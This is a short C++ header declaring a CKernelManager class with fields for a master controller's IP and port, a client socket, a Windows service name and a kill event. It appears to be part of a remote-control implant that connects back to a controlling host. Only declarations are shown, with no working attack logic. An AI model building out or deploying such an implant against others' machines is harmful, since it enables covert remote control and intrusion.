#pragma once

#include "Manager.h"


class CKernelManager : public CManager  
{
public:
	static	char	m_strMasterHost[256];   //主控制端的IP
	static	UINT	m_nMasterPort;          //主控制端的Port
	CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort);
	virtual ~CKernelManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	bool	IsActived();
private:
	bool	m_bIsActived;
	UINT	m_nThreadCount;
	HANDLE	m_hThread[10000];     //存储各个线程的句柄
};